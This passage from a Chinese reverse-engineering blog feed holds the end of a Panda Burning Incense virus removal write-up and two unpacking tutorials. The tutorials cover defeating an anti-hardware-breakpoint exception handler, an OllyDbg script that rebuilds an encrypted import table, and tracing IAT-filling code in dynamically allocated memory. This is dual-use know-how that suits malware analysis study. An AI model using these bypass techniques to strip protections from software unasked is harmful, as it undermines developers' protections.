<li><p>在系统目录下删除病毒文件：C:\WINDOWS\system32\drivers\spo0lsv.exe</p>
</li>
<li><p>删除启动项：Windows+R，键入msconfig打开服务配置窗口，切换启动窗口，取消启动项，并且记录下注册表位置</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-13-3925.jpg" alt="img"></p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-13-003925.jpg" alt="img"></p>
</li>
<li><p>修改注册表：Windows+R，键入regedit打开注册表窗口，找到相应位置，并删除记录</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-13-3911.jpg" alt="image-20200113083516026"></p>
</li>
</ol>
<h2 id="4-3-专杀工具"><a href="#4-3-专杀工具" class="headerlink" title="4.3-专杀工具"></a>4.3-专杀工具</h2><ul>
<li><p>效果图</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-13-3835.jpg" alt="image-20200113083529845"></p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-13-003917.jpg" alt="image-20200113083541900"></p>
</li>
<li><p>GitHub地址：<a href="https://github.com/21Gun5/AntiPanda" target="_blank" rel="noopener">https://github.com/21Gun5/AntiPanda</a></p>
</li>
</ul>
<h1 id="05-参考文献"><a href="#05-参考文献" class="headerlink" title="05-参考文献"></a>05-参考文献</h1><ul>
<li>《C++反汇编与逆向分析技术解密》</li>
<li>15PB视频课程-恶意代码分析实例</li>
<li><a href="https://blog.csdn.net/richard1230/article/details/79505200" target="_blank" rel="noopener">https://blog.csdn.net/richard1230/article/details/79505200</a></li>
</ul>
<p>首发于看雪论坛：<a href="https://bbs.pediy.com/thread-257202.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-257202.htm</a></p>
]]></content>
      <categories>
        <category>软件安全/逆向</category>
      </categories>
      <tags>
        <tag>病毒分析</tag>
      </tags>
  </entry>
  <entry>
    <title>脱壳实践笔记-反硬件断点</title>
    <url>/2019/11/24/reverse/%E8%84%B1%E5%A3%B3%E5%AE%9E%E8%B7%B5%E7%AC%94%E8%AE%B0-%E5%8F%8D%E7%A1%AC%E4%BB%B6%E6%96%AD%E7%82%B9/</url>
    <content><![CDATA[<p>[TOC]</p>
<h3 id="01-寻找OEP"><a href="#01-寻找OEP" class="headerlink" title="01-寻找OEP"></a>01-寻找OEP</h3><ol>
<li><p>pushad后，esp定律失败（壳oep处有花指令，按键1添加一个nop失效，手动右键-二进制修改为90</p>
</li>
<li><p>在主模块代码起始地址，使用Ctrl+B搜索“FF 15 ?? ?? ?? ??”，找到调用IAT的地方（或者FF 25；手动找太慢，直接搜索）</p>
</li>
<li><p>调用IAT确实是FF 15，排除宝蓝的BC++、Delphi程序，是VS的</p>
</li>
<li><p>程序跑起来后，在主模块ctrl+f搜索指令“sub esp 0x58”，果然找到，下面还有一个call，一般就是GetVersion，断定就是VC 6.0程序<a id="more"></a></p>
</li>
<li><p>除此之外，还可以VC 6.0 还有winMain函数的特征（winMain、sub esp 0x58、getVersion</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2019-11-22-020753.jpg" alt="image-20191121161139303"></p>
</li>
<li><p>找到真实oep</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2019-11-22-020754.jpg" alt="image-20191121161440388"></p>
</li>
</ol>
<h3 id="02-异常回调反硬件断点"><a href="#02-异常回调反硬件断点" class="headerlink" title="02-异常回调反硬件断点"></a>02-异常回调反硬件断点</h3><ol>
<li><p>在OEP处发现IAT加密了<br> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2019-11-22-020759.jpg" alt="image-20191121161834601"></p>
</li>
<li><p>IAT处设置硬件写入断点，发现并没有断下，真实oep处设置硬件执行，也没有断下，猜测有反硬件断点的技术；</p>
<p> 硬件断点没有触发-&gt;程序有反调试-&gt;会清除硬件断点或者让硬件断点失效</p>
</li>
<li><p>清除硬件断点的方法有哪些？相当于有哪些方法可以修改寄存器？</p>
<ol>
<li>SetThreadContext</li>
<li>异常回调函数中可以修改寄存器</li>
</ol>
</li>
<li><p>搜索SetThreadContext函数下断，发现并未断下，说明是异常回调起的作用（并未实测，win10虚拟机中的OD，ctrl+g不能搜API名）</p>
</li>
</ol>
<h3 id="03-反断点异常分析"><a href="#03-反断点异常分析" class="headerlink" title="03-反断点异常分析"></a>03-反断点异常分析</h3><h4 id="配置环境"><a href="#配置环境" class="headerlink" title="配置环境"></a>配置环境</h4><ul>
<li><p>如何分析带有异常的程序？</p>
<ul>
<li>修改OD菜单-选项-调试选项：将其中的选项统统取消打钩，尽可能不忽略异常</li>
<li>修改OD菜单-插件-StrongOD-Options：将其中跳过异常的选项取消打钩</li>
</ul>
</li>
<li><p>搭建异常触发环境</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2019-11-22-20750.jpg" alt="image-20191121163511503"></p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2019-11-22-020802.jpg" alt="image-20191121163541379"></p>
</li>
</ul>
<h4 id="分析异常"><a href="#分析异常" class="headerlink" title="分析异常"></a>分析异常</h4><ul>
<li><p>不忽略程序异常运行程序，一共有7处异常，依次如下：</p>
<p>  其中3、4尽管看起来发生的位置和异常类型是一致的，但实际上触发的位置是不同的，从堆栈能看出来二者不同（就像是，同一个API，a和b两处都可以调用，尽管被调用的API相同，但是调用的位置a和b是不同的）</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2019-11-22-020757.jpg" alt="image-20191121163818581"></p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2019-11-22-020823.jpg" alt="image-20191121163942584"></p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2019-11-22-020824.jpg" alt="image-20191121164040127"></p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2019-11-22-020828.jpg" alt="image-20191121164127484"></p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2019-11-22-020825.jpg" alt="image-20191121164149432"></p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2019-11-22-020827.jpg" alt="image-20191121164206546"></p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2019-11-22-020800.jpg" alt="image-20191121164226741"></p>
</li>
<li><p>哪一个异常对硬件断点清0？（在异常点设置硬件断点，看能不能断下，能断下说明当前异常点前面的异常处理函数中没有对硬件断点清0）</p>
<p>  第二个异常处下硬件执行，重新执行，能够断下来，说明第一个异常无辜</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2019-11-22-020744.jpg" alt="image-20191121191824207"></p>
<p>  第三个异常下断，也能断下来，说明1、2无辜</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2019-11-22-020756.jpg" alt="image-20191121192219618"></p>
<p>  <strong>第四个异常下断，没有断下来，说明第三次异常处理中，对硬件断点清0</strong></p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2019-11-22-020803.jpg" alt="image-20191121192554307"></p>
</li>
<li><p>重新运行，至第三次异常，通过堆栈窗口，发现第三次的SEH处理程序是43AF42，光标移动到此，直接enter，使其反汇编窗口中跟随，发现疑似设置清零寄存器的代码（硬件断点基于寄存器，寄存器清零即消除硬件断点</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2019-11-22-20826.jpg" alt="image-20191121193506344"></p>
</li>
<li><p>将此地址设置为硬件执行断点（下面才是硬件断点清零的操作，所以此处可以下断），重新运行至此时，直接dump内存保存下来（dump时不用动其他设置，直接点脱壳即可，因为仅仅是为了看代码，能不能运行无所谓；之所以在此处dump，是为了后面IDA打开时，能直接停在43AF42时</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2019-11-22-020826.jpg" alt="image-20191121193930282"></p>
</li>
<li><p>IDA中打开上述dump后的文件，打开就在43AF42处（如上所言）</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2019-11-21-114529.png" alt="image-20191121194526170"></p>
</li>
<li><p>IDA中，structures窗口-edit-add struct type来添加新的结构体类型（mac 没有insert按键）</p>
<p>  最终操作后如下，确实是一个断点清零0的操作（具体结构体添加的操作，见逆向实战-笔记3-IDA使用-结构体部分）</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2019-11-22-020750.jpg" alt="image-20191121195243343"></p>
<p>  IDA中，F5解析为C代码（进一步验证</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2019-11-22-020801.jpg" alt="image-20191121195415253"></p>
</li>
<li><p>（硬件断点设置和取消，是通过设置寄存器来实现的的；是经过一个context结构体的，而非直接改dr0、Dr1这些单个的位</p>
</li>
</ul>
<h4 id="突破反硬件断点"><a href="#突破反硬件断点" class="headerlink" title="突破反硬件断点"></a>突破反硬件断点</h4><ul>
<li><p>已经找到消除硬件断点的地方了，只需要跳过即可，可以将0043AF57以下的代码到0043AF72全部nop</p>
</li>
<li><p>恢复之前的异常触发环境，使其能忽略异常（调试选项-异常-钩都打上、strongOD-option-skip some exception也打上）</p>
</li>
<li><p>找到真实oep的地方，设置硬件执行断点，在消除硬件断点的前面也设置硬件执行断点（42为消除、86为oep</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2019-11-22-020751.jpg" alt="image-20191121201846874"></p>
</li>
<li><p>重新运行，首先会断在42处（因为设置了硬件断点，他要消除），在这将关键代码nop掉，这样，OEP那就能成功断下来</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2019-11-22-020758.jpg" alt="image-20191121202059712"></p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2019-11-22-20802.jpg" alt="image-20191121202157938"></p>
</li>
<li><p>像这样，只要每次设置硬件断点时，程序若要消除这些硬件断点，一定会跳到42处，只要跳到这，就将其nop掉，这样，后面的硬件断点就能正常断下了</p>
</li>
</ul>
<h3 id="04-填充IAT的地方"><a href="#04-填充IAT的地方" class="headerlink" title="04-填充IAT的地方"></a>04-填充IAT的地方</h3><ul>
<li><p>IAT处设置硬件写入断点，重新运行，又到了反硬件断点的地方，手动nop掉，继续，成功断在IAT写入的地方（由于是写入断点，陷阱类，eip指向下句）</p>
<p>  先断在这，找了找，不是</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2019-11-22-020814.jpg" alt="image-20191121202901653"></p>
<p>  后断在这</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2019-11-22-020752.jpg" alt="image-20191121203813185"></p>
</li>
<li><p>第二次断的地方，918C处，向上翻并没有发现，ctrl+up键进行微调，成功找到（ctrl+up时关掉mac的键盘映射）</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2019-11-22-20753.jpg" alt="image-20191121204003173"></p>
</li>
</ul>
<h3 id="05-获取API地址的地方"><a href="#05-获取API地址的地方" class="headerlink" title="05-获取API地址的地方"></a>05-获取API地址的地方</h3><ul>
<li><p>写脚本的一般思路：API地址获取后，保存地址到临时变量，在填充IAT时，填充这个临时变量的值（即真正API的地址），而非经过壳代码处理后的加密值</p>
</li>
<li><p>从8A填充IAT的地方，F7单步向下走，时刻关注寄存器，看是否出现“xxx.yyy”的形式（尤其是eax寄存器</p>
</li>
<li><p>若遇到循环，想办法跳出，5个关键点：向上跳的循环、循环跳到哪、二者之间的条件跳转、条件跳转何时跳出循环何时仍在循环内、下断点在跳出循环的位置</p>
</li>
<li><p>第一个循环（crtl+F7自动跑，F7暂停）</p>
<p>  1：向上跳，标示是一个循环；</p>
<p>  2: 向上跳的循环，跳到此；</p>
<p>  3/4: 12之间的Jxx条件跳转；</p>
<p>  由下到上，即由1-2之间找跳转，1、3、4均是；</p>
<p>  先测试1的，若跳出循环，则下在5，测试，发现程序跑到真实oep处，不对，舍去；</p>
<p>  再测试3，发现正常循环内，3压根执行不到；</p>
<p>  再测试4，若要出循环，就不跳，在6处下断，F9运行至此，再ctrl+F7，发现可以出循环，正确</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2019-11-22-20759.jpg" alt="image-20191122084136249"></p>
</li>
<li><p>第二个循环</p>
<p>  自上而下测试，先测试1处的，要跳出，需要在1下面，即4，但4也是往上跳，因此再往下，断点下载5，F9运行至此，继续F7单步；</p>
<p>  3处，发现无论跳与不跳，都要执行到1，都会再往上跳，故舍去；</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2019-11-22-20756.jpg" alt="image-20191122090542037"></p>
</li>
<li><p>跳出第二个循环后，就要慢点F7了，时刻关注寄存器是否出现xxx.yyy的形式（重点eax）</p>
</li>
<li><p>跳出第二个循环后，继续F7，发现又进入了第一个循环，再次F9使其跳出循环1，然后又进入循环2，也再次F9跳出循环2，继续F7，最终终于到此</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2019-11-22-020749.jpg" alt="image-20191122094732050"></p>
</li>
<li><p>99处下断，测试一下，是否每次运行完此条，eax都会出现xxx.yyy，发现确实如此</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2019-11-22-020755.jpg" alt="image-20191122095727759"></p>
</li>
<li><p>也注意到，这条指令是出现在循环1内部的，想想也对，这种操作肯定是需要循环操作的，因此，以后再遇到循环，先看其内部，有没有这种操作，先测试再说，万一就是呢</p>
</li>
<li><p>先不管99处是否是获取API地址的call，反正运行99后，寄存器中会出现xxx.yyy这种形式，这样就够了，这样就能够写脚本了（停在9F，反正eax有真正的函数地址，即xxx.yyy形式）</p>
</li>
<li><p>注意：</p>
<ul>
<li>不知道内部究竟是怎么循环的，跳过了循环1，还可能进入循环2，再跳出循环2后，还可能再次进入循环1……</li>
<li>没什么规律可循，反正就是坚持这样的原则：碰到循环，就想法跳出循环</li>
<li>玄学问题，不要深究，能找到位置就行</li>
</ul>
</li>
<li><p>妈耶，我都要被自己啰嗦死了（可能这就是菜吧</p>
</li>
</ul>
<h3 id="06-写OD脚本自动操作"><a href="#06-写OD脚本自动操作" class="headerlink" title="06-写OD脚本自动操作"></a>06-写OD脚本自动操作</h3><ul>
<li>三个通用的地址<ul>
<li>OEP</li>
<li>填充IAT</li>
<li>获取API地址</li>
<li>（执行完相关指令的下一位置，而非当前位置）</li>
</ul>
</li>
<li>通用思路<ul>
<li>获取API地址处：获取寄存器的值，赋值给临时变量（xxx.yyy，即API真正地址</li>
<li>填充IAT处：直接填充临时变量的值，即填充真实API地址，而非被壳修改过的</li>
<li>OEP处：一直运行，直至运行到OEP，标志填充IAT结束</li>
</ul>
</li>
<li>特殊地址：清除硬件断点的地方<ul>
<li>因不同的壳而异</li>
<li>再如，有的壳，填充IAT的代码在壳申请的内存空间中，这样，每次地址都不相同，需要先获取申请后的基地址</li>
</ul>
</li>
<li>步骤<ul>
<li>右键-脚本功能-脚本运行窗口</li>
<li>右键-读取脚本-打开相应脚本文件</li>
<li>先用OD运行程序到壳OEP处，再使用脚本（不可在一开始的系统断点处就使用脚本，会出错）</li>
</ul>
</li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 1. 找到相关地址（前三个是通用的）   </span></span><br><span class="line">MOV vOEP,<span class="number">00409486</span> <span class="comment">// OEP地址</span></span><br><span class="line">MOV vGetAPIAddr,<span class="number">438F</span>9F <span class="comment">// 获取API地址</span></span><br><span class="line">MOV vWriteIATAddr,<span class="number">43918</span>c <span class="comment">// 写入IAT地址</span></span><br><span class="line">MOV vHardwarePointAddr,<span class="number">0043</span>AF51 <span class="comment">// 清除硬件断点的地方</span></span><br><span class="line">MOV vAPIaddr,<span class="number">0</span><span class="comment">// 临时变量存储真实API地址</span></span><br><span class="line"><span class="comment">// 2. 设置断点（先清除其他，防干扰）  </span></span><br><span class="line">BPHWC<span class="comment">// 清除所有硬件断点 </span></span><br><span class="line">BC<span class="comment">// 清除所有软件断点</span></span><br><span class="line"></span><br><span class="line">BPHWS vHardwarePointAddr,<span class="string">"x"</span> <span class="comment">// 在此处下断，运行到此即停止</span></span><br><span class="line">BPHWS vOEP,<span class="string">"x"</span> <span class="comment">//</span></span><br><span class="line">BPHWS vGetAPIAddr,<span class="string">"x"</span> <span class="comment">// </span></span><br><span class="line">BPHWS vWriteIATAddr,<span class="string">"x"</span> <span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//（记住大体形式，举一反三）</span></span><br><span class="line"><span class="comment">// 3.0 循环：F9运行程序</span></span><br><span class="line">LOOP_1: </span><br><span class="line">	RUN</span><br><span class="line"><span class="comment">// 3.1 清除硬件断点：若断在此，则将其NOP掉10h个字节</span></span><br><span class="line">	CMP eip,vHardwarePointAddr</span><br><span class="line">	JNZ SIGN_1</span><br><span class="line">	fill vHardwarePointAddr,<span class="number">22</span>,<span class="number">90</span><span class="comment">//NOP 10h个字节</span></span><br><span class="line"><span class="comment">// 3.2 获取API地址：若断在此，则保存API地址到临时变量</span></span><br><span class="line">SIGN_1:</span><br><span class="line">	CMP eip,vGetAPIAddr </span><br><span class="line">  JNZ SIGN_2</span><br><span class="line">	MOV vAPIaddr,eax</span><br><span class="line"><span class="comment">// 3.3 填充IAT：若断在此，则填充真实API地址（临时变量）</span></span><br><span class="line">SIGN_2:</span><br><span class="line">	CMP eip,vWriteIATAddr </span><br><span class="line">  JNZ SIGN_3</span><br><span class="line">	mov [edi], vAPIaddr<span class="comment">//依据填充IAT的指令，来决定目的是谁</span></span><br><span class="line"><span class="comment">// 3.4 OEP：若断在此，则结束，否则继续循环</span></span><br><span class="line">SIGN_3:</span><br><span class="line">	cmp eip,vOEP </span><br><span class="line">  JE EXIT_1</span><br><span class="line">	JMP LOOP_1</span><br><span class="line"><span class="comment">// 3.5 弹框，标示结束</span></span><br><span class="line">EXIT_1:</span><br><span class="line">	MSG <span class="string">"修复完毕"</span></span><br></pre></td></tr></table></figure>
<ul>
<li><p>当所有的修复完毕之后，发现IAT不是一个典型的IAT数组 ，隔4个出现一个（长型-地址）</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2019-11-22-75129.jpg" alt="image-20191122145503344"></p>
</li>
<li><p>转换hex窗口，再仔细观察，发现每一个地址后面都多了一个0，因此还需要继续修复</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2019-11-22-075131.jpg" alt="image-20191122145717687"></p>
</li>
<li><p>工具：通用导入表修复工具</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2019-11-22-075129.jpg" alt="image-20191122152618812"></p>
</li>
<li><p>工具使用</p>
<ul>
<li>PChunter查看06.exe的进程ID</li>
<li>代码起始和结尾：程序代码段要包含在其中</li>
<li>新的IAT VA：新建的IAT放在哪，放在壳代码所在区段中就行，因为脱壳后，壳所在区段肯定用不着了（脱壳后，仅仅是改变OEP为真实的OEP，让程序跳过壳代码，壳那块区段还是存在的</li>
<li>修复输入表：一般就别点了，因为在这是新建一个IAT表，ImportREC是通过IAT表来修复输入表的</li>
</ul>
</li>
<li><p>原理：</p>
<ul>
<li><p>在代码段里找调用IAT的地方，如</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2019-11-22-075126.jpg" alt="image-20191122153036972"></p>
</li>
<li><p>在0x43CFCD中，一定保存的是 getVersion真实的地址，获取真实地址</p>
</li>
<li><p>找一个新的地方，将这些地址按照正确的格式存起来</p>
</li>
<li><p>OD脚本跑完后，IAT中的地址其实也是正确的，只不过格式不多（每一个后面都加了0），而ImportREC工具是依据IAT来修复输入表的，格式错误他肯定是识别不出来，所以要新建一个格式正确的IAT数组</p>
</li>
<li><p>（仅仅看代码段中调用了外部dll的哪些API，没调用的哪些自然不用管，因为程序运行也用不到啊</p>
</li>
</ul>
</li>
<li><p>效果</p>
<ul>
<li><p>修复之前，代码段调用和IAT在内存中：</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2019-11-22-075126.jpg" alt="image-20191122153036972"></p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2019-11-22-075130.jpg" alt="image-20191122153734532"></p>
</li>
<li><p>修复后，代码段调用时地址变了，IAT也在其他内存新建了一份</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2019-11-22-075128.jpg" alt="image-20191122153814266"></p>
</li>
</ul>
</li>
</ul>
<h3 id="08-dump内存"><a href="#08-dump内存" class="headerlink" title="08-dump内存"></a>08-dump内存</h3><ul>
<li><p>OD脚本跑完后，正好停在真实OEP处，脱壳保存为06.dump.exe</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2019-11-22-075127.jpg" alt="image-20191122154305338"></p>
</li>
<li><p>利用7中，新建的IAT表来修复输入表（在这就别点重建输入表了，出错几率大，还是用专业的ImportREC，大家各司其职</p>
</li>
</ul>
<h3 id="09-修复输入表（依据新建的IAT"><a href="#09-修复输入表（依据新建的IAT" class="headerlink" title="09-修复输入表（依据新建的IAT"></a>09-修复输入表（依据新建的IAT</h3><ul>
<li><p>先IAT，再输入表，就是通过IAT重建输入表，转储至8中dump后的文件</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2019-11-22-075122.jpg" alt="image-20191122154752632"></p>
</li>
<li><p>dump后打开失败，转储后打开成功，脱壳成功！</p>
</li>
</ul>
<h3 id="10-参考"><a href="#10-参考" class="headerlink" title="10-参考"></a>10-参考</h3><ul>
<li>15PB 脱壳课程</li>
</ul>
<p>首发于看雪论坛：<a href="https://bbs.pediy.com/thread-257823.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-257823.htm</a></p>
]]></content>
      <categories>
        <category>软件安全/逆向</category>
      </categories>
      <tags>
        <tag>脱壳逆向</tag>
      </tags>
  </entry>
  <entry>
    <title>脱壳实践笔记-动态空间填充IAT</title>
    <url>/2019/11/22/reverse/%E8%84%B1%E5%A3%B3%E5%AE%9E%E8%B7%B5%E7%AC%94%E8%AE%B0-%E5%8A%A8%E6%80%81%E7%A9%BA%E9%97%B4%E5%A1%AB%E5%85%85IAT/</url>
    <content><![CDATA[<p>[TOC]</p>
<h3 id="01-找OEP：esp定律"><a href="#01-找OEP：esp定律" class="headerlink" title="01-找OEP：esp定律"></a>01-找OEP：esp定律</h3><ul>
<li><p>F8过PUSHFD、esp右键-HW break、F9</p>
</li>
<li><p>单步几下到达：有个sub esp,0x58，下面还有一个call（一般就是GetVersion），故可判定VC 6.0</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2019-11-22-135527.jpg" alt="image-20191122185855905"></p>
</li>
<li><p>下面的WinMain也算是Vc6.0的特征<a id="more"></a></p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2019-11-22-135521.jpg" alt="image-20191122185927427"></p>
</li>
<li><p>若pushad与pushfd连着，则fd之后再下断</p>
</li>
<li><p>暂停至popfd后，是一个call，enter过去是lea esp</p>
</li>
<li><p>call xxx + lea esp [esp+4] = jmp xxx（混淆指令-化简为繁</p>
<ul>
<li>CALL 001E1CD7 = push 001E1CD7+5（sub esp,0x4）、jmp 001E1CD7</li>
<li>LEA ESP,DWORD PTR SS:[ESP+0x4]：add esp,4</li>
</ul>
</li>
<li><p>有些call不是真正的函数，要F7，而非F8</p>
</li>
</ul>
<h3 id="02-填充IAT的地址是动态变化的"><a href="#02-填充IAT的地址是动态变化的" class="headerlink" title="02-填充IAT的地址是动态变化的"></a>02-填充IAT的地址是动态变化的</h3><ol>
<li><p>FF 15那个call IAT的地方，数据窗跟随，IAT处异常，IAT被壳修改了</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2019-11-22-135523.jpg" alt="image-20191122190023454"></p>
</li>
<li><p>IAT处下硬件写入断点，重新运行，检查断下的地方是否正确（有时没有那么准确，一下就到断在理想位置；通过上面的地址和值判断</p>
</li>
<li><p>第一次断在rep movs那，硬件写入为陷阱类，指向下一条，故rep movs的上一条才是；rep movs 物理上一条为JB语句，也不可能是其他地方jmp过来的，jmp指令不可能触发硬件写入，故舍去</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2019-11-22-135525.jpg" alt="image-20191122191018196"></p>
</li>
<li><p>再一次断在call处，目的地址同1中都是475080，故这就是（源地址不同，但都是xx5039，可能是一个偏移</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2019-11-22-135517.jpg" alt="image-20191122191140575"></p>
</li>
<li><p>在mov 上设置硬件执行断点，去掉原来的硬件写入，重新运行，发现有时会断下，有时断不下；而硬件写入时，每次都会准确断下，推测此指令所在地址是动态变化的</p>
</li>
<li><p>重复1-5，反复测试，发现mov这条填充IAT的指令地址是不确定的，但是后面那个0895是确定的，应该是一个偏移，所以推测：<strong>壳代码填充IAT的代码是在申请的内存中执行</strong> （偏移+申请内存的首地址 = 最终地址</p>
</li>
<li><p>验证上述猜想</p>
<ul>
<li>申请内存用 VirtualAlloc，ctrl+g搜索并下断点，堆栈中观察调用处，是主模块调用再停止，否则放行；</li>
<li>enter进入调用处，call下1下断，F9使其跑完此函数，返回值eax=300000，这就是申请空间的基地址</li>
<li>基地址+填充IAT指令的偏移0895=0x300895，ctrl+g到内存窗口，发现都是0</li>
<li>F9继续执行，发现0x300895此处内存已改变，右键-反汇编，正是mov 那条填充IAT的指令，验证上述猜想</li>
</ul>
</li>
</ol>
<h3 id="03-准确找到填充IAT的地方"><a href="#03-准确找到填充IAT的地方" class="headerlink" title="03-准确找到填充IAT的地方"></a>03-准确找到填充IAT的地方</h3><ol>
<li><p>调用VirtualAlloc的地方<code>0047A37D CALL EAX</code> ，此处下断，运行至此时F8，得到eax即基地址 0x1F0000</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2019-11-20-134146.jpg" alt="image-20191120191855196"></p>
</li>
<li><p>基地址+填充IAT指令的偏移，0x1F0000 + 0x0895 = 0x1F0895，跳到此处，下硬件执行（此时刚申请完内存，具体代码还没有拷过去，所以是一堆00，不打紧，照样下断</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2019-11-20-134149.jpg" alt="image-20191120191920293"></p>
</li>
<li><p>F9运行，发现断在0x1F0895（此时就有代码了</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2019-11-20-134143.jpg" alt="image-20191120191815132"></p>
</li>
<li><p>这样就可保证，每次都会断在填充IAT处（不像一开始有时候断成功，有时候失败</p>
</li>
</ol>
<h3 id="04-壳代码中自定义了API"><a href="#04-壳代码中自定义了API" class="headerlink" title="04-壳代码中自定义了API"></a>04-壳代码中自定义了API</h3><ol>
<li>GetProcAddr用来获取API地址，若要填充IAT（别管是不是修改后再填充，都会用到此</li>
<li>ctrl+g，搜索，下断，堆栈中，非主模块的调用放行，测试发现，主模块并没有调用此API（一直放行，都放到填充IAT指令那了都没出现），推测：<strong>壳代码中自己实现了一个GetProcAddress</strong></li>
<li>同样的思路，GetModuleHandleA和W下断，也没找到（真实OEP之后的调用肯定不是，在到达真实OEP前，已经填充完IAT了，也就已经调用完GetModuleHandleA了</li>
</ol>
<h3 id="05-找获取API地址的地方"><a href="#05-找获取API地址的地方" class="headerlink" title="05-找获取API地址的地方"></a>05-找获取API地址的地方</h3><ol>
<li><p>每次运行，都要获取壳代码申请的内存空间的首地址，此时为1f0000（有随机性，每次申请的都不一样，故如此（系统有伪随机性，何况是在虚拟中，尽管如此，也要获取，确保万无一失</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2019-11-22-135518.jpg" alt="image-20191122192636153"></p>
</li>
<li><p>填充IAT的位置偏移0895+基地址1f0000=1f0895，下硬件执行，运行到此</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2019-11-22-135522.jpg" alt="image-20191122193041387"></p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2019-11-22-135526.jpg" alt="image-20191122193108680"></p>
</li>
<li><p>F7单步向下执行，发现进入循环，暂不看代码窗口，只关注堆栈窗口，发现是挨个字符的判断（一个函数名中全部字符的循环</p>
</li>
<li><p>运行到向上跳的jmp时，就是循环语句，在本jmp指令与它跳往的地方，二者之间，找JXX条件跳转语句，JXX一般就是跳出循环的</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2019-11-20-134148.jpg" alt="image-20191120202646938"></p>
</li>
<li><p>在跳出的xx1ccc下断，F9测试一下，发现就不是一个函数名中各个字符的循环了，而是一个个函数名的循环，表示确实是跳出了内层的循环</p>
</li>
<li><p>在4的基础上继续F7单步，继续找负责本层循环的jxx条件跳转语句（这一个逻辑正好与4相反，4:跳则出循环，5:不跳才是出循环，但实质相同 </p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2019-11-20-134150.jpg" alt="image-20191120203141485"></p>
</li>
<li><p>4的循环时一个函数名字符串中各个字符的循环，5的循环是多个函数名的循环，猜测，接下来就是多个dll的循环了（函数名称字符串有多个字符、一个dll有多个函数、一个exe有多个dll）</p>
</li>
<li><p>在5的基础上，继续F7单步，此时就要慢点了，快要到关键点了，要时刻关注寄存器窗口，肯定会出现xxx.yyy此种形式；发现1911执行后，eax中出现xxx.yyy</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2019-11-20-134151.jpg" alt="image-20191120204525809"></p>
</li>
